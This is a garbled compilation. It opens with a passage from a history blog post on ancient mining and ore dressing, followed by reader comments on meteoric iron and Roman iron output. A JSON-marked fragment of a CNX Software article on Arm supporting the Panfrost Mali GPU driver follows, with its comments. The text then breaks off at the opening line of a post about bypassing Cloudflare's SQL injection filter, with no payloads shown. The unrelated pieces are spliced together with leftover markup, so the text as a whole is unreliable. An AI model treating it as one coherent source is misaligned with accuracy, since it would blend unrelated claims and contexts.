Agricola’s mine-workers (note that the translation I linked to uses the word ‘miner’ to mean essentially ‘mine-owner’ whereas ‘workman’ is the word used when Agricola means actual mine-laborers) live in a barracks next to the shift house.  While Agricola insists that mining is not so perilous as often believed, it is impossible not to note the sheer number of references to accidents which might befall workmen, from cave-ins to falling down ladders to drowning in undrained water, to death by poisonous fumes or bad air, to a note that mine workmen are peculiarly subject to disease.



One might wonder, even with amenities or small legal privileges, why anyone would sign up for this kind of work.  Obviously, non-free miners sent to the mines either as enslaved or convict labor had no choice, but as noted even in the ancient world, there seem to have been a significant number of free miners as well.  The supply of desperate people willing to work in such a dangerous job becomes more understandable when we think about the structure of the agricultural economy around these mines: opportunities for wage labor were few, so for individuals who found themselves without any land of their own, economic options to survive were limited.  The rural or urban poor were mostly not in a position to acquire the skills necessary to work as craftsmen (such skills were generally passed down through apprenticeship systems and often restricted by professional societies like guilds or collegia).  Indeed, the tendency of cities to accumulate unemployable laborers seems to have been a major motivator for many of the large-scale state building projects (like those of Pericles, or Augustus), effectively as ‘jobs programs’ at state expense; that such projects seem to have always found large and ready labor forces is telling.  This inefficiency, an economy not well organized to effectively employ surplus labor, is a common feature of pre-modern economies, creating a ready supply of people desperate enough to do things like work in the mines merely to eat.



Meanwhile, mines were effectively never owned or operated by the miners themselves.  While we occasionally see periods where private ownership of mines is common (there seems to have been a fair bit of this in the Roman Republic) in practice, mining seems to have been a state-dominated enterprise in both the ancient and medieval world.  Typically, the ruler (king, lord, emperor, etc) owned the mine itself and appointed an administrator to oversee it for him.  The Athenian state seems to have owned and controlled the silver mines at Laurium; oversight, operations and contracting were supervised by a board of poletai appointed from the citizenry.  Mines in the Hellenistic kingdoms seem to have generally been the property of the king personally and mining in pre-Roman Gaul was apparently owned by the Gallic nobility.  Roman mines during the imperial period were almost all part of the fiscus (the personal property of the emperor which functioned as a sort of second treasury).  Actual on-the-ground administration of the mines varied, sometimes run by conductores or procuratores appointed by the state, sometimes contracted out to private government contractors, the publicani (this more commonly in the Republic).



All Dressed Up



Once our ore reaches the surface (or is removed from its open pit) it is not immediately ready for smelting, but has to go through a series of preparatory steps collectively referred to as ‘dressing’ to get the ore ready for its date with the smelter (note: it seems to me that roasting is sometimes included in ore dressing and sometimes not; we’ll talk about it next week).



Ore removed from the mine would need to be crushed, with the larger stones pulled out of the mines smashed with heavy hammers (against a rock surface) in order to break them down to a manageable size.  The exact size of the ore chunks desired varies based on the metal one is seeking and the quality of the local ore.  Ores of precious metals, it seems, were often ground down to powder, but for iron ore it seems like somewhat larger chunks were acceptable.  I’ve seen modern experiments with bloomeries (which we’ll get to next week) getting pretty good results from ore chunks about half the size of a fist.  Interestingly, Craddock notes that ore-crushing activity at mines was sufficiently intense that archaeologists can spot the tell-tale depressions where the rock surface that provided the ‘floor’ against which the ore was crushed have been worn by repeated use.



Plate from Agricola’s De Re Metallica (1556), different kinds of ore-washing going on at a mine, with ore being jigged.Ore might also be washed, that is passed through water to liberate and wash away any lighter waste material.  Washing is attested in the ancient world for gold and silver ores (and by Georgius Agricola for the medieval period for the same), but might be used for other ores depending on the country rock to wash away impurities.  The simple method of this, sometimes called jigging, consisted of putting the ore in a sieve and shaking it while water passed through, although more complex sluicing systems are known, for instance at the Athenian silver mines at Laurium (note esp. Healy, 144-8 for diagrams); the sluices for washing are sometimes called buddles.  Throughout these processes, the ore would also probably be hand-sorted in an effort to separate high-grade ore from low-grade ore.  



Greek artwork showing miners at work.  The man on the right is mining with a pick, the leaning man in the center appears to be hand-sorting ore into a basket, while the two on the left lift it out of the mine.  The large hanging amphora in the center is an oil-lamp.It’s clear that this mechanical ore preparation was much more intensive for higher-value metals where making sure to be as efficient as possible was a significant concern; gold and silver ores might be crushed, sorted, washed and rewashed before being ground into a powder for the final smelting process.  Craddock presents a postulated processing set for copper ore for the Bronze Age Timna mines that goes through a primary crushing, hand-sorted division into three grades, secondary crushing, grinding, a winnowing step for the low-grade ore (either air winnowing or washing) before being blended into the final smelter ‘charge.’ 



As far as I can tell, such extensive processing for iron was much less common; in many cases it seems it is hard to be certain because the sources remain so focused on precious metal mining and the later stages of iron-working.  Diodorus describes the iron ore on Elba as merely being crushed, roasted and then bloomed (5.13.1) but the description is so brief it is possible that he is leaving out steps (but also, Elba’s iron ore was sufficiently rich that further processing may not have been necessary).  In many cases, iron was probably just crushed, sorted and then moved straight to roasting, which we will cover next week.



Conclusion: From Large Rock to Slightly Smaller Rock



I realize the reader may be a bit disappointed that we have spent all of this time to get our iron ore from being in the ground in a very large rock, to hewn out of the ground into a slightly smaller, but still large rock, to smashed (and possibly washed) into a small rock, which still doesn’t get us very close to any kind of metal.  One assumes ancient miners were also disappointed at just how much effort it took to force the earth to give up its bounty.



And we are not, in most cases, about the leave the mining site either.  Iron ore, even crushed, is terribly heavy and bulk and as we’ll see next week, the ratio of metal to useless rock really favors useless rock.  Consequently, if you could do the entire smelting process at the mine, you did, rather than transport so much of that useless rock far away only to have it turned into slag there.



But there’s a larger shift that’s going to happen in our processing next week, because we’re going to begin applying heat.  And that means we’re going to need fuel.  Lots of fuel, it turns out.  Lots and lots of fuel.  So, next week: roasting and smelting.  We’re going to let a thousand iron flowers bloom (a pun so bad it could make you, like Diodorus’ miners, wish for death).

					Great article, as usual. I only have one question at the moment. I realize that “meteoric iron” is too rare to be used across a society in any sort of scale. But one of my buddies told me once long ago that the reason you have so many stories of magic swords falling from the sky is probably some sort of disorted memory about superior tools and weapons being forged from meteoric iron, which would have been a superior quality to what was made by contemporary craftsmanship. Is there any basis to that, or is this just moonshine?

					There are a decent number of videos of modern blacksmiths trying to forge something out of meteoric iron, and usually failing spectacularly. Maybe they’re too used to working with relatively homogeneous materials and all the weirdness inside a meteorite throws them for a loop. But it does seem like you’d have to be very lucky to get a meteorite that’s 90%+ iron, and then you’d have to have a bunch of people who aren’t experienced with forging iron to turn it into something usable, since I doubt they’d bother once they figured out how to exploit indigenous iron deposits.
Anyway, I think it’s possible, but it’d be incredibly rare. You’d need the right sort of meteorite and then you’d need people who were more used to working with copper and bronze to not break it beyond repair.

					There’s a modern katana made from meteoric iron:https://www.cnet.com/news/sword-of-heaven-katana-forged-from-meteorite/
No idea how the quality compares to the smith’s other work.
As I understand it there are two places that have or had enough meteoric iron for the locals to be experienced in using it: The Gibeon meteorite in Namibia and the Cape York meteorite in Greenland.

					There’s actually a type of meteorite specifically known as ‘iron meteorites’ which have ninety per cent or more iron content.  The main theory is that they were once part of the iron core of a small planetary body or something such, which met with disaster.
 Wikipedia gives a figure of them representing slightly more than 4% of meteorites known to hit the Earth’s surface (and cites ‘The Lunar and Planetary Institute’ and a couple of other websites as its sources.)

					There appears to have been some limited use of meteoric iron in pre-contact North American north of the Rio Grande, most specifically with the Cape York meteorite being used by local Inuit to cold-forge arrow and lance heads. However, it’s also worth noting that Inuit people would have had very limited access to any metal tools, especially at Cape York’s latitude (about that of the Svalbard islands). I’m not sure if archaeologists focusing on the Americas have done many experiments to compare cold-forged meteoric iron with other tool materials.

					“By the beginning of the iron age in Europe (which varies by place, but tends to start between c. 1000 and c. 600)”
I’m confused. Are these BC (BCE) or AD (CE)? Is this some notation I haven’t seen before?
I’d always thought that the idea with building a fire against the rock was to shatter it by the thermal stress when you throw water on it, but you seem to be saying that is secondary. Also, is the vinegar thing the source of Will Cuppy’s snark about Hannibal using vinegar as a high explosive?

					Dates clarified.
Firesetting works by shattering the rocks through thermal expansion (since the heated area of rock has no space to expand into), rather than through the stress of sudden cooling, as I understand it.  On the Hannibal point, I couldn’t tell you.

					It’s possible they would augment fire-setting with throwing water in sieges.  If the enemy is already shooting at you, adding the risk of hot chips of stone flying from where the water hit is not much of a concern.
It is known archaeologically that some masonry city walls from the Bronze Age Near East show marks of fire-setting.

					It may be that the theory that ores regrew arose from the premodern and Early Modern ‘scientific’ theories about how rocks came to be, rather than from empiricle observation of mines. Three major ones were they were formed from the action of celestial influences on the Earth and/or the Four Elelments within it, they grew from ‘petrific seeds’ in the same way plants grew from seed, or that a liquid called lapidifying juice circulated through the Earth and turned various substances which it touched to stone ( for example Parascelsus described how this juice could turn sea water into pumice). Info admittedly from a rather old book (Adams, F. D. 1938 The Birth and Development of the Geological Sciences)

					Hah! Thanks for asking and answering those, because I was literally just about to ask Dr. Devereaux myself if he was aware of by what purported mechanism this regeneration was supposed to happen. For all the talk about how popular culture and video games have colored our perceptions of how things were in pre-modern times, it’s hilarious to me that people in pre-modern times apparently believed that as per many a strategic video game, resources will respawn if you just wait long enough.

					I was reading stuff about alchemy years ago, and they mention mine regeneration belief. Some of it was that the distinction between living matter and non-living matter didn’t exist in the way it does now. Mines were “alive”, sort of, because the Earth was. Like how you always hear about how alchemist either wanted to make gold or to make potions of immortality. To alchemists, these weren’t two different things, it was just about creating perfect versions of living stuff.

					Geology seems to be susceptible to myth-making, with the myths (even when accidentally created) often being particularly difficult to dispel.  See the Superman III film where towards the end Superman flies into a coal mine, picks up a lump of coal, crushes it in his hand, and moments later opens his hand to show a ‘diamond’.  Presumably the original intent of the scriptwriter was ‘superman has synthesised a diamond from a piece of coal’ (which should be problematic enough, outside the context of a film which is essentially about a magic (or pseudo-magic if you prefer) alien-space-knight) but the scene seems to have been seen by a lot of people as ‘superman FINDS a diamond in a piece of coal’, leading to a belief/myth that diamonds are NORMALLY found in coal.
 Several decades on from Superman III, judging from the fact that (at the date of this post) even Wikipedia ( ‘…A common misconception is that diamonds are formed from highly compressed coal. Coal is formed from buried prehistoric plants, and most diamonds that have been dated are far older than the first land plants. It is possible that diamonds can form from coal in subduction zones, but diamonds formed in this way are rare, and the carbon source is more likely carbonate rocks and organic carbon in sediments, rather than coal…’ ) seems to feel it necessary in its diamonds article to specifically call out the diamonds & coal myth, the myth is still apparently going strong. 
 But way back before the superman films, people were making wild guesses about the dinosaurs and what could have happened to them, or inventing conflicting versions of ‘where the planet came from’. 
 If the guys around the Mediterranean in the first century AD believed regular holes-in-the-ground type ‘mines’ recharged, they may well have had their own Superman III story behind it, from somewhere, and this is an era where the rational explanation for lightning involves a supernatural entity called ‘Jupiter’ (or a cultural counterpart equivalent.)

					What have you wrought!
It’s profoundly weird that labor was so cheap that even extremely simple tasks (crushing the ore and, if necessary for drainage, lifting water) often weren’t done with with machine-power, i.e. wind- or watermills, but muscle.  But then, this is an economic argument, and it assumes that people would have used kites for power and traction (and perhaps military reconnaissance), and that where only heat was required (not carbon as a reagent), they would have built parabolic mirrors to avoid the massively inefficient step of photosynthesis.
Ironworking was held up for a time when the blacksmiths unionized.  They would always strike when the iron was hot.
Lindybeige is also annoyed at completely-wrong depictions of ironworking: https://www.youtube.com/watch?v=8E6TzT0eCYs
(Another bit: in the example starting at 3:00, there is a fire on the outside of the mould.  Were the filmmakers inspired/confused by Rodman guns, perhaps?  That’s the only example I know of where a mould would be heated.)

					Bret:
 ‘…Well, I have good news for historical you as compared to video game you: iron is the fourth most common element in earth’s crust, making up around 5% of the total mass of the part of the earth we can actually mine…’
 The 5% figure it looks to me like you’re using is the ‘percent by weight’ figure which statisticians of these things like to use – which can be horribly misleading as to how ‘present’ iron might be, not least since iron is dense (especially so as compared to the elements above it in the ‘percent by weight’ rankings.) 
 Rather than write a mini-essay on geology here, about how the figures are further skewed by a number of complications, I’ll just say that I’m with the video-game developers on this one, in terms of you shouldn’t be able to build an iron mine and start churning ore out anywhere in a medieval Europe-like environment. 😦

					I’ll add though that if (in the pre-modern society of your choice) you have enough slaves to work to death and whole forests to burn (the latter reminds me of one of the Saruman pieces on this site) some iron mineral containing rocks which should otherwise be marginal, at best, might move into the exploitable bracket.

					Iron is about twice as heavy per atom as silicon or aluminum, and about 3.5x as heavy as oxygen (the more common ones), so will be maybe 1.5-2% of atoms in the crust (yes, I could look this up, but approximation like this works pretty well.)  not as common, but still pretty common, seems enough for a good sized province, kingdom, etc. to have something available.

					Except that figure is an ‘average’; due to hydrological and bacteria places, that iron is ‘concentrated’ in some places (e.g. Precambrian banded iron formations in deserts and the outback in Australia (one of those heavily mined modern sources Bret mentions), or up in that former volcanic pile inside the arctic circle at Kiruna in Sweden) whilst being virtually absent from (or spread out in quantities so low as to be unusable even with slave labour – e.g. as microscopically thin films around every grain of ‘sand’ in some desert sandstones) others. 
 Yes, it’s absolutely great if you’re sitting on top of something like a banded iron formation – you have all the iron you ever want, and more than enough to sell to others – but if not, you have to hope you’ve got something which got locally enriched by hydrological processes (even if that’s only whatever bog-iron there is), or actually go looking somewhere else for it.
 One of the reasons Germany invaded Norway in WW2 was that they desperately needed all-year-round access to that Swedish ore from Kiruna, and they couldn’t afford to see the British potentially take control of the overland rail route to Narvik and the sea-lanes from there, by which Swedish iron ore was most easily shipped during the winter.  (And then France collapsed and the Germans got the (lower quality) oolitic Lorraine iron ore, too, as a bonus, but the Germans didn’t know France would go down like that when they launched the Norway operation.)

					There’s a pretty big difference between the iron demands of a modern, industrial war-machine and the iron demands of a pre-modern state, even a very large one.  Iron deposits sufficient for the latter might be insufficient to the former.
One estimate for the Roman Empire suggested an empire-wide iron production around 82,500 tons (note, finished iron, note ore; as you’ll see next week, there’s a big difference there) per year.  By contrast, German steel production in 1940 was 22,000,000 tons per year; 266 times higher.
For that reason it is perilous to extrapolate pre-modern iron demands from modern iron-mining. On the one hand, many deposits that can be worked today were inaccessible or uneconomical for pre-modern miners relying on hand-tools.  But on the other hand, the iron demands of a modern industrial society are so much higher – multiple orders of magnitude, you will note – that iron deposits that might have sustained a pre-modern society almost indefinitely would today be exhausted by a mid-sized country in a matter of years.

					By your own account, the Romans aren’t just going to Elba for iron (which at least is an island they can presumably shift stuff on ships from) for iron, but all the way up to Noricum too.  That alone suggests to me that this is not a material which they can just find lying around outside the Rome city gates in quantities which even a ‘pre-industrial’ civilization like Rome needs. 
 DHZ (‘The Rock-forming Minerals) lists Goethite as FeO.OH by the way, to correct you on a point.  My memory of the specifics of geochemistry is somewhat fuzzy, but the OH being after the dot, instead of lumped in with the other O and the Fe is supposed to be significant in some way (and this is ‘A collection of Unmitigated Pedantry’ after all! 😉 )  The Magnetite being identified as Fe3O4, is probably acceptable unless there’s a way to make both superscript and subscript work simultaneously, so that one of the Fe can be identified as (2+ (superscript)) and the other two as (3+ (superscript)). (I think the point of the superscript values business has to do with other elements replacing them in the crystal structure, but again it’s been ages since I wrestled with (and often lost to) geochemistry.)
 I may venture back into DHZ later, but I caught sight of something about Limonite not actually technically being an independent mineral and have slammed it shut and returned it to its protective storage bag!

					It is an “average” and will be more or less concentrated in certain places (why ore mines exist), however, a high concentration means a better chance for a particular random place to have a high concentration somewhere nearby. 
As others are pointing out, historical records back this up, most places seem to have a relatively easy time getting the iron they need.

					Mobile telephones are commonplace in many countries today.  Does this mean that Coltan deposits can be found all over the world to make essential parts of these mobile telephones?  The answer is ‘no’, Coltan deposits cannot be found all over the world.  There are a very limited number of deposits, and these are very thoroughly being exploited by governments and mega-corporations, so that everyone else can have Coltan and said governments and mega-corporations can turn for themselves a very nice profit.
 It’s sounding to me as if the Elba and Noricum mines Bret mentions may have been the Rio Tinto Zinc mining mega-corporations of their day, tapping the closest-to-Rome known good deposits, and finding that actually they were good enough to keep large areas of Italy (and possibly beyond) supplied – and no doubt making a tidy profit for whoever had the mining concession (or Imperial Roman equivalent) for them.  (Were senators allowed to own mines, or was that sort of activity supposed to be ‘beneath them’ and they had to simply be content with taking, uh, ‘gifts’ from whoever got appointed (no doubt by them)?) 
 And again: what on Earth are the Romans doing digging out iron ores all the way up in Noricum if these are minerals which supposedly they are able to find ‘anywhere’?  I know the Romans are considered to have had excellent transport and communications systems, but this is still somewhere up in the Alps, as best I can make out, where they were digging, and the Romans did not have heavy goods vehicles with internal combustion engines to move their iron ingots around.  Elba, they can stick stuff on a ship and move it anywhere by sea – no problem; but Noricum?

					Look More Closely Later, 21st century manufacturing is not a sensible guide to medieval / ancient manufacturing because of our globalised and amazingly efficient transportation networks.
Mobile phones don’t use coltan, they use the niobium and tantalum mined from coltan. It would be possible to mine these from elsewhere else: Wikipedia lists six other countries that produce some tantalum and another eight that have known deposits. BUT because of our 21st C shipping network and the existing infrastructure, right now it is cheaper to mine coltan in one place and ship all over the world.
About a decade ago IIRC there were stories about China increasing the prices on some of their “rare earth” minerals and holding the rest of the world hostage, driving up consumer electronic prices, etc. This quickly collapsed when various western governments asked various mining companies “is there anything you could do to save us?” and were told sure, the only reason they weren’t producing these themselves was that the Chinese charged less. In the 21st C, small efficiencies in mining and infrastructure lead to concentration.
Iron ore itself is not sufficient. Brett has told us that fuel supplies and infrastructure also matter. If the Roman iron mines at Noricum already had both high quality ore and the necessary fuel and infrastructure, then yes the efficient transport networks of Rome (not just mechanical efficiency, but also the social efficiency that you’re less likely to get ripped off by bandits and local tolls) would lead to the same sort of large scaling mining and export.
The point Bret was making is that compared to bronze, “for the most part, getting iron ore was not hard.”

					As I recall from stuff about 19th century metal production, you move iron ore to where the fuel is, which is why steel mills are in Pittsburgh near the coal fields instead of Wisconsin/Minnesota where the iron ore is.
I think it may be the other way around with copper smelting.

					‘which has been estimated to produce a truly staggering 10,000,000 tons per year of ore for several centuries during the Republic’
‘One estimate for the Roman Empire suggested an empire-wide iron production around 82,500 tons (note, finished iron’
Are these numbers consistent?  If all the ore came from Elba, that would mean 0.008 of the ore comes out as iron by weight if there’s more ore, less.
10 million tons of ore a year, over 365 days and 10,000 workers, is 2.7 tons of ore per worker-day. Is that plausible?  Do we need more workers?

					Yes, the numbers don’t add up.
From wikipedia:
  – “The typical grade of iron at which a magnetite-bearing banded iron formation becomes economic is roughly 25% iron”
  -“Banded iron formations (BIFs) are sedimentary rocks containing more than 15% iron”
  -“Export-grade DSO ores are generally in the 62–64% Fe range”
So, even if we assume rather low-grade ore and that some of the iron is lost in the process, that still leaves more than factor 10 to be explained.
10.000 workers my be a bit on the low side. As a point of comparison, “Carthage must be destroyed” by Richard Miles gives the number of 40.000 slaves for the spanish silver mines in the roman period.

					You’re right to point out that the estimates are inconsistent; they come from different sources and are estimated different ways.  For my own part, I think it’s likely that the Roman iron consumption figure is the one that is off and real figure might be higher.  But it’s hard to say how much higher.  A lot of work on the ancient economy is, at best, informed guesswork.
As for the ratio of iron-ore to finished iron, as far as we can tell, ancient iron-working was a lot less efficient than modern iron-working.  From raw ore to finished goods, the estimates range from 8-16% of the mass of the ore ends up in the finished product.  Not quite enough to explain the discrepancy, but still a big gap from modern figures.
It is also worth noting though that these two figures are for different periods.  Elba is active during the Roman Republic and seems to be the primary supply of iron for all of Italy.  The estimated figure for total consumption is for the empire.

					Mining engineer here, enjoying this series…
I will start by saying that I know very little about ancient mining, but a fair bit of modern practices, and the wikipedia figures are ok rules of thumb for mining today.  In general, older mining is at higher grades and closer to surface – the richer, easier orebodies were mined first (within a given area).
Some iron deposits are so rich, they are pushing the stoichiometric limits, i.e., they are composed of pure iron mineral (hematite or magnetite) – these are the DSO deposits (Direct Shipping Ore, e.g. Mary River Mine in Nunavut).  These ores skip some processing steps and can go straight to steel-making.
As Bret noted (and I’m sure will explain in future installments), the conversion rates of ore to metal are very different now…

2.7 tons of ore per day is, I would say, entirely possible. One man with a shovel can move one ton (or one cubic yard) of loose soil in one hour.

This episode of Absolute History shows the process by which c. 1500 CE farmers (could have) exploited lead deposits on a very small scale as an additional source of income to pay their taxes.
Rather notable is the amount of wood used: an almost 2 meter high pile to smelt 2 or 3 small ingots.

					Modern steels last much longer. Also, we don’t put a lot of our stuff to heavy use – you go through a lot of chisels and picks breaking rocks. Also, a lot gets locked away where it cannot be re-used – Romans used iron clamps to hold stone building blocks together, for instance. For whatever reason, iron was much more used in the middle ages (the Catalan forge – an early blast furnace, plus greater use of water power may have had something to do with it).

					I have no stake in the iron ore wars, but I’d note that price/ease of access can matter.  It could be true both that iron ore is widely available and that particular locations are economically dominant due to quality, access, or nearby smelting infrastructure so you don’t have to ship bulky ore around.

					Quality was clearly a factor – Indian and Noricum iron was higher value. But the main constraint was fuel. A low-grade iron deposit near a forest was better than a high-grade one where wood was expensive. Even for finished products, transport was sufficiently expensive that local production persisted until quite recently.

Reverse-engineering is not needed anymore."",""articleSection"":""Graphics"",""articleBody"":""Most GPU drivers found in Arm processors are known to be closed-source making it difficult and time-consuming to fix some of the bugs since everybody needs to rely on the silicon vendor to fix those for them, and they may even decide a particular bug is not important to them, so you'd be out of luck.    So the developer community has long tried to reverse-engineer GPU drivers with projects like Freedreno (Qualcomm Adreno), Etnaviv (Vivante), as well as Lima and Panfrost for Arm Mali GPUs. Several years ago, Arm management was not interested at all collaborating with open-source GPU driver development for Mali GPUs, but as noted by Phoronix, Alyssa Rosenzweig,\u00a0 a graphics software engineer employed by Collabora, explained Panfrost development was now done in partnership with Arm during a talk at the annual X.Org Developers' Conference (XDC 2020).        A recent merge commit confirms the move with Daniel Stone, Graphics Leads at Collabora commenting  To reiterate the answer from earlier - based on information &amp; support from Arm, it now more accurately describes the actual ISA and matches the actual forms &amp; nomenclature used.  CNX Software contacted Collabora for further information about the partnership, and while they would not comment on whether they were also getting financial support from Arm for the development, Daniel's answer looks promising:  ... Collabora and the Panfrost community have developed a reverse-engineered driver supporting the Midgard and Bifrost generation of Mali GPUs, as an almost entirely independent self-funded effort. We are very proud of this work, and the fact it has high performance, good levels of functionality, and a high level of conformance with the specifications.    However reverse-engineering necessarily brings an overhead as we need to spend time discovering how the hardware really works, including the most optimal way to perform various operations, and particular quirks of the hardware.    Arm are now working together with Collabora to provide us with information and documentation which allows us and the community to understand the hardware. This information allows us to focus on the best possible driver without the time and guesswork involved in reverse engineering. Collabora are continuing our effort to have Panfrost working on all the devices from these generations, towards maximum performance, full conformance with the specifications, and the largest possible feature set. Whilst we have already been doing this, Arm's support enables us to accelerate this work, and deliver the best possible driver with a commitment of long-term support.  So that means a stable Panfrost driver should be expected quite earlier, and possibly with higher quality, than if the company still had to spend time and resources on reverse-engineering."",""keywords"":""arm, collabora, gpu, mali, open source, panfrost, "",""name"":""Arm Officially Supports Panfrost Open-Source Mali GPU Driver

Several years ago, Arm management was not interested at all collaborating with open-source GPU driver development for Mali GPUs, but as noted by Phoronix, Alyssa Rosenzweig,  a graphics software engineer employed by Collabora, explained Panfrost development was now done in partnership with Arm during a talk at the annual X.Org Developers’ Conference (XDC 2020).A recent merge commit confirms the move with Daniel Stone, Graphics Leads at Collabora commentingTo reiterate the answer from earlier – based on information & support from Arm, it now more accurately describes the actual ISA and matches the actual forms & nomenclature used.CNX Software contacted Collabora for further information about the partnership, and while they would not comment on whether they were also getting financial support from Arm for the development, Daniel’s answer looks promising:… Collabora and the Panfrost community have developed a reverse-engineered driver supporting the Midgard and Bifrost generation of Mali GPUs, as an almost entirely independent self-funded effort. We are very proud of this work, and the fact it has high performance, good levels of functionality, and a high level of conformance with the specifications.However reverse-engineering necessarily brings an overhead as we need to spend time discovering how the hardware really works, including the most optimal way to perform various operations, and particular quirks of the hardware.Arm are now working together with Collabora to provide us with information and documentation which allows us and the community to understand the hardware. This information allows us to focus on the best possible driver without the time and guesswork involved in reverse engineering. Collabora are continuing our effort to have Panfrost working on all the devices from these generations, towards maximum performance, full conformance with the specifications, and the largest possible feature set. Whilst we have already been doing this, Arm’s support enables us to accelerate this work, and deliver the best possible driver with a commitment of long-term support.So that means a stable Panfrost driver should be expected quite earlier, and possibly with higher quality, than if the company still had to spend time and resources on reverse-engineering.Jean-Luc Aufranc (CNXSoft)Jean-Luc started CNX Software in 2010 as a part-time endeavor, before quitting his job as a software engineering manager, and starting to write daily news, and reviews full time later in 2011.Support CNX Software - Donate via PayPal, become a Patron on Patreon, or buy review samplesAdvertisements  Your browser does not support the video tag.Related posts:Linux 5.2 Release – Main Changes, Arm, MIPS & RISC-V Architectures Rock Pi 4 SBC Runs GNOME & KDE Plasma using Panfrost Open Source GPU Driver & Wayland Open ARM GPU Drivers FOSDEM 2013 Video and Call to ARM Management Panfrost Open-Source Arm Mali GPU Driver Gets Experimental OpenGL ES 3.0 Support Perfetto Profiler Now Supports Mali GPU Hardware Counters via Panfrost  googletag.cmd.push(function() { googletag.display('div-gpt-ad-1597905513858-0'); });CategoriesGraphicsTagsarm, collabora, gpu, mali, open source, panfrostConnect with:      Subscribe   LoginNotify of new follow-up commentsnew replies to my comments              {} [+]  Name* Email* Website I agree to the Privacy Policy The comment form collects your name, email and content to allow us keep track of the comments placed on the website.

Even better, give them the source code 1  Reply   Author Jean-Luc Aufranc (CNXSoft)  5 days ago        tonny As I understand it, Arm sharing the code could lead to legal issues around patents. The current setup probably works because Arm does not have to share anything publicly. They can provide documentation and support, Collabora likely needs to keep any documents from Arm private, and releases source code without Arm being directly involved in software development. 12  Reply   Frank Earl  3 days ago        Jean-Luc Aufranc (CNXSoft) This would be on top of the other detail that came out recently.What use does NVidia have for these GPUs since they have their own? 0  Reply  zoobab  5 days ago   Where are the datasheets? 4  Reply   dgp  5 days ago        zoobab See Jean-Luc’s comment above… and there will likely never be public datasheets. It’s likely a lot of the information you might want isn’t in nice datasheet format anyway i.e. there are probably a bunch of excel files or similar exported from the HDL that make up the “register map” section you’d expect in a datasheet. This is a massive step forward either way. Panfrost will essentially become the public documentation for these GPUs and now Arm are helping there will be a lot less fumbling around in the dark. If manufacturers start using panfrost over the binary drivers we should… Read more » 9  Reply  itchy n scratchy  5 days ago   Shabby if you know how they treated the guy who started lima driver many years ago.

They were using the Odroid Go Advance for testing and im really interested in buying that handheld. With open source graphics in the future it will become even better 1  Reply  NicoD  5 days ago   I couldn’t be more happy with this news. Linux ARM needs good GPU drivers, but also good VPU. I hope they’ll get access to that too. Panfrost is good now, but still needs a lot of work. This is the only way to make people see arm is the way to go by having these things working well. I can’t wait to see what comes out of it. Cheers, NicoD 0  Reply   Author Jean-Luc Aufranc (CNXSoft)  5 days ago        NicoD In most cases, the code for GPU and VPU is complete separate, and in many cases, Arm does not provide the VPU IP. 2  Reply   itchy n scratchy  5 days ago        Jean-Luc Aufranc (CNXSoft) There is cedrus for allwinner vpus and hantro for rockchip and i.mx (NXP) vpus in mainline and they are working pretty well (Allwinner) and getting better and better (hantro).Not sure about mainline status of pi and amlogic. 3  Reply  Jon Smirl  5 days ago   Note that this is being done right before NVidia acquires ARM. And note that NVidia has stated that they will begin licensing NVidia GPU designs in conjunction with ARM CPUs.Hmmm… is Panfrost dead and this is being push out before the new master can say — no! 6  Reply   itchy n scratchy  5 days ago        Jon Smirl Probably the mali business unit has to be spun off due to antitrust? 0  Reply   Jon Smirl  5 days ago        itchy n scratchy Not if they simply shut it down. 1  Reply   itchy n scratchy  5 days ago        Jon Smirl Well id expect that the worlds leading gpu manufacturer won’t be allowed to take over one of the most important mobile GPU manufacturers…I know hopes… High hopes… 1  Reply   Jon Smirl  5 days ago        itchy n scratchy AFAIK Nvidia does not have any low end, mobile capable designs. So in the beginning they will have to stick with the ARM GPUs. IDK how hard it is to convert those high-end designs for the low end. As for anti-trust I wouldn’t really say Nvidia is a major presence in the cell phone GPU market. Their Tegra chips went no where. So there is no conflict. What is going to change is the future. Nvidia is going to push their architecture design down into the mobile SOCs. But that will take a couple of years. Short term Nvidia is… Read more » 5  Reply  itchy n scratchy  4 days ago        Jon Smirl Well actually all the tegras are coming with an integrated Nvidia GPU, so they clearly are having a suitable solution of their own.But well speculation until we know more.But definitely no great news for the mainline blob free experience 0  Reply  Frank Earl  3 days ago        Jon Smirl 1) ARM isn’t just Cell-phones. 2) There’s more than just Cell-phones in the embedded space. 3) NVidia’s a force to be reckoned with in the Embedded Space for things other than Cell Phones.What an amazingly NARROW minded view you have there…(I say this as I mention the Switch and am looking at no less than four X2’s in my office space due to WORK…) 0  Reply  Frank Earl  3 days ago        Jon Smirl That could raise Anti-trust scrutiny (Buy up a main competitor (and they are) for the embedded space and shutter the GPU division?)Spun off is usually what transpires if they don’t run it as a bargain basement IP offering. 0  Reply  Nd D  5 days ago   This is a great news. 0  Reply  James Jones  4 days ago   What’s the Nvidia purchase going to do to this? 0  Reply   Frank Earl  3 days ago        James Jones Probably nada. It was done by them prior to purchase- they’re likely to either spin off the GPU division, which means nothing changed, or they’re going to go with Mali at the lower end, which would be the same. Closing down the Mali group has bad Anti-trust issues, so one of the two will be done. And, in either case, it’s not “leaking” their IP or ceding control of the high end. What’s pathetic about NVidia’s take on things? During the heyday of the Utah-GLX, they were the most OPEN of the GPU companies, but you couldn’t even lay hands… Read more » 0  ReplyAdvertisements googletag.cmd.push(function() { googletag.display('div-gpt-ad-cnx-softwarecom35142'); });Post navigationPrevious PostPrevious 3µA/MHz Ambiq Apollo 4 MCU Targets Battery-powered IoT Devices with Voice ProcessingNext PostNext DeskMini X35G Ice Lake Mini PC Coming in October for $400 and up (Crowdfunding)  Subscribe to CNXSoft Blog by Email  Search for:  SearchAdvertisements Trending Posts – Last 7 DaysSponsors     Advertisements googletag.cmd.push(function() { googletag.display('div-gpt-ad-cnx-softwarecom35144'); });Recent Commentslezioul on AAWireless Enables Wireless Android Auto on Android 9.0+ Smartphones (Crowdfunding)Sander on Rivet Networks launches Killer E3100 2.5GbE USB adapteritchy n scratchy on Wallys WiFi 5 (802.11ac) mini PCIe cards deliver higher Tx power and performance (Sponsored)itchy n scratchy on GigaDevice GD32E5 Cortex-M33 microcontrollers target motor and industrial controlfossxplorer on AMD Launches Chromebook-Optimized Ryzen and Athlon 3000 C-Series Mobile ProcessorsSubscribe to Comments RSS FeedAdvertisements Embedded Systems JobsEmbedded Software Engineer2 September 2020 - Boise, United States of AmericaAs an Embedded Engineer for SIG - Micron Systems Integration Group in Boise Idaho, you will be working on a wide range of Software and Hardware Engineering responsibilities.

    How I bypassed Cloudflare's SQL Injection filter
            
                
                    on Web
                
                04 Sep 2020In late 2018 I was tasked with performing a Web Application security assessment
for a large client.
After running the standard scans with automated tools, something interesting
